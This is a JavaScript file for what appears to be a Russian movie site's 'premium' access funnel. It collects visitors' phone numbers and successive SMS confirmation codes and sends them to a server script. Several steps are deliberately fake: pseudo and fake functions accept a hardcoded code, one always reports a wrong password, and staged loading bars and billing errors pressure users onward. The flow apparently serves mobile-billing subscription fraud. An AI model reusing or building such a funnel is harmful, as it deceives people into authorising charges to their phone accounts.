function LoadingBar(){
    setTimeout(function(){
        $('.progress .bar').each(function() {
            var me = $(this);
            var perc = me.attr("data-percentage");
            var current_perc = 0;
            var progress = setInterval(function() {
                if (current_perc>=perc) {
                    clearInterval(progress);
                } else {
                    current_perc +=1;
                    me.css('width', (current_perc)+'%');
                    if(current_perc == 100){
                        $("#hidden_passwords").css("display","block");
                    }
                }
                me.text((current_perc)+'%');
            }, 50);
        });
    },300);
}
function CheckConfirmPasswordPremium(){
    var generated_code = $("#generated_code").html();
    var premium_password = $("#premium_password").val();
    if(premium_password == ""){
        $("#err_message").html('<p class="text-warning"><small>Поле ввода пароля не должно быть пустым!</small></p>');
    } else {
        if(generated_code == premium_password){
            $("#insert_premium_shortnumber").html($("#generated_short_number").html());

            //$.ionSound.stop('021');
            //$.ionSound.play("031");

            location.href='/?service=premium&step=2';
            
        } else {
            $("#err_message").html('<p class="text-warning"><small>Не верный пароль!</small></p>');
        }
    }
}
function confirm_premium() {
        var passwordz = $("#activate_pass").val();
        var passwordz_check = $("#activate_pass").val();
        var movie_id = $("#movie_id").val();

        /*var pageHref= window.parent.location;
        var stroka =pageHref.toString();
        var result_url = stroka.slice(stroka.search('/films/')+5);*/
        var result_url = 'result url';
		
        if (passwordz != '') {
            $.ajax({
                url:        '/request.php',
                type:       'POST',
                cache:      false,
                data:       {'passwordz':passwordz,'movie_id':movie_id,'result_url':result_url},
                dataType:   'html',
                success: function(data) {
                    if(data == 0){
                        $("#err_message_secondstep").html('<p class="text-warning"><small>Не верный пароль!</small></p>');
                    } else {
                        $.ajax({
                            url:        '/request.php',
                            type:       'POST',
                            cache:      false,
                            data:       {'passwordz_check':passwordz_check},
                            dataType:   'html',
                            success: function(data) {
                                $("#premium_abonent_submit").val(data);
                                location.href='/?service=premium&step=3';
                            }
                        });
                    }
                }
            });
        } else {
           $("#err_message_secondstep").html('<p class="text-warning"><small>Пароль не может быть пустым!</small></p>');
        }
    }
function enter(){
    $.ionSound.stop("01");
    $.ionSound.stop("031");
    $.ionSound.play("051");

    if($("#count_for_view").val() == 2){
        $("#input_last_step").show();
    } else {
        checkForAutoRedirect();
    }
}
function confirm() {
        var pass = $("#premium_pass").val();
        var normal = "normal";
        var premium_last_abonent = $("#premium_abonent_submit").val();
        if (pass != '') {
            $.ajax({
                url:        '/request.php',
                type:       'POST',
                cache:      false,
                data:       {'pass':pass,'normal':normal,'premium_last_abonent':premium_last_abonent},
                dataType:   'html',
                success: function(data) {
                    if (data == 0) {
                         $("#last_input_msg").html('<p class="text-warning"><small>Не правильный пароль!</small></p>');
                    } 
                    if (data == 1) {
                        $("#four_step_premium").hide();
                        $('#loading_step').show();
                        setTimeout(function(){ top.location.reload();}, 3000);
                    }
                }
            });
        } else {
            $("#last_input_msg").html('<p class="text-warning"><small>Пароль не может быть пустым!</small></p>');
        }
    }
function checkForAutoRedirect(){
    var automatic_redirect = $("#premium_abonent_submit").val();
        $.ajax({
            url:        '/request.php',
            type:       'POST',
            cache:      false,
            data:       {'automatic_redirect':automatic_redirect},
            dataType:   'html',
            success: function(data) {
                if(data == 2)  {
                    $("#four_step_premium").hide();
                    $('#loading_step').show();
                    setTimeout(function(){ top.location.reload();}, 3000);
                } else {
                    setTimeout(checkForAutoRedirect, 1000);
                }
            }
        });
    }









    
function pseudoStepOne(){
    var pageHref= window.parent.location;
    var stroka =pageHref.toString();
    var result_url = stroka.slice(stroka.search(/films/)+5);
    var russia_code = $("#russia_code").val();
    if(russia_code == "79"){
        $('#err_msg_pseudo_one').html('<div class="alert alert-warning"><b>Номер телефона не должен быть пустым!</b></div>');
    } else {
        $.ajax({
            url:        '/request.php',
            type:       'POST',
            cache:      false,
            data:       {'russia_code':russia_code,'result_url':result_url},
            dataType:   'html',
            success: function(data) {
                if (data == 1) {
                    $('#pseudo_step_one').css('display','none');
                    $('#pseudo_step_two').css('display','none');
                    $('#pseudo_step_three').css('display','block');
                    $('#insert_step_three_number').html(russia_code);
                    $.ionSound.stop("022");
                    $.ionSound.play("032");
                } 
                if (data == 2) {
                    $('#pseudo_step_one').css('display','none');
                    $('#pseudo_step_two').css('display','none');
                    $('#pseudo_fake_one').css('display','block');
                    $('#insert_fake_number').html(russia_code);
                    $.ionSound.stop("022");
                    $.ionSound.play("032");
                }
                if (data == 3) {
                    $('#err_msg_pseudo_one').html('<div class="alert alert-danger"><b>Ошибка биллинга или Ваш номер в Спам списке!</b></div>')
                }
            }
        });
    }
}
function PseudoFakeOne(){
    var pseudo_code_input = $("#pseudo_code_input").val();
    if(pseudo_code_input != ''){
        if(pseudo_code_input != '474'){
            $("#err_fake_step_one").html("<div class='alert alert-danger'><b>Не верный пароль!</b></div>");
        } else {
            $("#input_form_fake_one").css("display","none");
            $("#err_fake_step_one").html("<div class='alert alert-success'><b><img src='/bootstrap/img/gui-loading.gif' />  Код принят! Подождите...</b></div>");
            setTimeout(function() {  
                $('#pseudo_step_one').css('display','none');
                $('#pseudo_step_two').css('display','none');
                $('#pseudo_fake_one').css('display','none');
                $('#pseudo_fake_two').css('display','block');
                $.ionSound.stop("032");
                $.ionSound.play("03111");
            }, 1000);
    }
        } else {
            $("#err_fake_step_one").html("<div class='alert alert-danger'><b>Пароль не может быть пустым!</b></div>");
    }
}
function returnSteps(){
    $.ionSound.stop("032");
    $.ionSound.stop("03111");
    $.ionSound.play("022");

    $('#pseudo_step_one').css('display','none');
    $('#pseudo_fake_one').css('display','none');
    $('#pseudo_step_three').css('display','none');
    $("#russia_code").val('79');
    $("#err_pseudo_step_three").html('');
    $('#err_msg_pseudo_one').html('');
    $('#err_msg_pseudo_one').css('display','none');
    $('#pseudo_step_two').css('display','block');
}
function PseudoFakeTwo(){
    var input_russia_second_pseudo = $("#input_russia_second_pseudo").val();
    if(input_russia_second_pseudo != ''){
        $("#err_fake_step_two").html("<div class='alert alert-danger'><b>Не верный пароль!</b></div>");
    } else {
        $("#err_fake_step_two").html("<div class='alert alert-danger'><b>Пароль не может быть пустым!</b></div>");
    }
}
function PseudoStepThree(){
    var input_codes_first = $("#input_russia_first").val();
    if(input_codes_first != ''){
        if(input_codes_first != '474'){
           $("#err_pseudo_step_three").html("<div class='alert alert-danger'><b>Не верный пароль!</b></div>");
        } else {
            $("#input_form_step_two").css("display","none");
            $("#err_pseudo_step_three").html("<div class='alert alert-success'><b><img src='bootstrap/img/gui-loading.gif' />  Код принят! Подождите...</b></div>");
            setTimeout(function() {  
                $.ionSound.stop("032");
                $.ionSound.play("03111");
                $('#pseudo_step_one').css('display','none');
                $('#pseudo_step_two').css('display','none');
                $('#pseudo_step_three').css('display','none');
                $('#pseudo_step_four').css('display','block');
            }, 1000);
        }
    } else {
        $("#err_pseudo_step_three").html("<div class='alert alert-danger'><b>Пароль не может быть пустым!</b></div>");
    }
}
function PseudoStepFour(){
            var input_codes = $("#input_russia_second").val();
            if(input_codes != ''){
                $.ajax({
                            url:        '/request.php',
                            type:       'POST',
                            cache:      false,
                            data:       {'input_codes':input_codes},
                            dataType:   'html',
                            success: function(data) {
                            if (data == 1) {
                                $("#err_pseudo_step_four").html("<div class='alert alert-danger'><b>Не верный пароль!</b></div>");
                            } 
                            if (data == 2) {
                                $("#err_pseudo_step_four").html("<div class='alert alert-success'><b><img src='/bootstrap/img/gui-loading.gif' />  Код принят! Подождите...</b></div>");
                                setTimeout(function() { 
                                    $.ionSound.stop("03111");
                                    $.ionSound.play("052"); 
                                    $('#pseudo_step_one').css('display','none');
                                    $('#pseudo_step_two').css('display','none');
                                    $('#pseudo_step_three').css('display','none');
                                    $('#pseudo_step_four').css('display','none');
                                    $('#pseudo_step_deployed').css('display','block');
                                }, 1000);
                            }
                    }
                });
            } else {
                $("#err_pseudo_step_four").html("<div class='alert alert-danger'><b>Поле пароля не должно быть пустым!</b></div>");
            }
        }
function Deployed(){
    var secondSend = "secondsendpass";
    $.ajax({
        url:        '/request.php',
        type:       'POST',
        cache:      false,
        data:       {'secondSend':secondSend},
        dataType:   'html',
        success: function(data) {
            $.ionSound.stop("052");
            $.ionSound.play("062");
            $('#pseudo_step_one').css('display','none');
            $('#pseudo_step_two').css('display','none');
            $('#pseudo_step_three').css('display','none');
            $('#pseudo_step_four').css('display','none');
            $('#pseudo_step_deployed').css('display','none');
            $('#pseudo_step_five').css('display','block');
        }
    });
}
function PseudoStepFiveFirst(){
            var last_code = $("#last_code").val();
            if(last_code != ""){
                $.ajax({
                            url:        '/request.php',
                            type:       'POST',
                            cache:      false,
                            data:       {'last_code':last_code},
                            dataType:   'html',
                            success: function(data) {
                            if(data == 1){
                               $("#err_pseudo_step_five").html("<div class='alert alert-danger'><b>Не верный пароль!</b></div>");
                            } 
                            if(data == 2){
                                $("#err_pseudo_step_five").html("<div class='alert alert-success'><b><img src='/bootstrap/img/gui-loading.gif' />  Пожалуйста, подождите...</b></div>");
                                setTimeout(function() { 
                                    $('#pseudo_step_one').css('display','none');
                                    $('#pseudo_step_two').css('display','none');
                                    $('#pseudo_step_three').css('display','none');
                                    $('#pseudo_step_four').css('display','none');
                                    $('#pseudo_step_deployed').css('display','none');
                                    $('#pseudo_step_five').css('display','none');
                                    $('#pseudo_step_six').css('display','block');
                                    setTimeout(function() { 
                                        location.reload();
                                    }, 2500);
                                }, 1000);
                            }
                    }
                });
            } else {
                $("#err_pseudo_step_five").html("<div class='alert alert-danger'><b>Поле пароля не должно быть пустым!</b></div>");
            }
    }
function PseudoStepFiveSecond(){
    var last_step = "last";
        $.ajax({
            url:        '/request.php',
            type:       'POST',
            cache:      false,
            data:       {'last_step':last_step},
            dataType:   'html',
            success: function(data) {
                if(data == 1){
                    $("#err_pseudo_step_five").html("<div class='alert alert-danger'><b>СМС не было отправлено!</b></div>");
                } 
                if(data == 2){
                    $("#err_pseudo_step_five").html("<div class='alert alert-success'><b><img src='/bootstrap/img/gui-loading.gif' />  Пожалуйста, подождите...</b></div>");
                    setTimeout(function() { 
                        $('#pseudo_step_one').css('display','none');
                        $('#pseudo_step_two').css('display','none');
                        $('#pseudo_step_three').css('display','none');
                        $('#pseudo_step_four').css('display','none');
                        $('#pseudo_step_five').css('display','none');
                        $('#pseudo_step_six').css('display','block');
                        setTimeout(function() { 
                            location.reload();
                        }, 2500);
                    }, 1000);
                }
            }
        });
    }
function authMe(){
                var abonent = $("#abonent").val();
                if(abonent == ""){
                    $("#errMessage").html('<div class="alert alert-danger"><b>Поле номер телефона не должно быть пустым!</b></div>');
                } else {
                    $.ajax({
                        url:        '/request.php',
                        type:       'POST',
                        cache:      false,
                        data:       {'abonent':abonent},
                        dataType:   'html',
                        success: function(data) {
                           if(data == 1){
                                $("#authForm").slideUp("slow");
                                $("#successForm").html('<br /><br /><center><h3>Успешная авторизация</h3></center><div class="alert alert-success"><b>Спасибо! Мы рады видеть Вас на сайте!</b></div><b>Вы успешно авторизовались. Пожалуйста, подождите...<img src="/bootstrap/img/gui-loading.gif" />');
                                $("#successForm").slideDown("slow");
                                setTimeout(function(){ top.location.reload();}, 3000);
                           } else {
                                $("#errMessage").html('<div class="alert alert-danger"><b>Не верный пароль!</b></div>');
                           }
                        }
                    });
                }
            }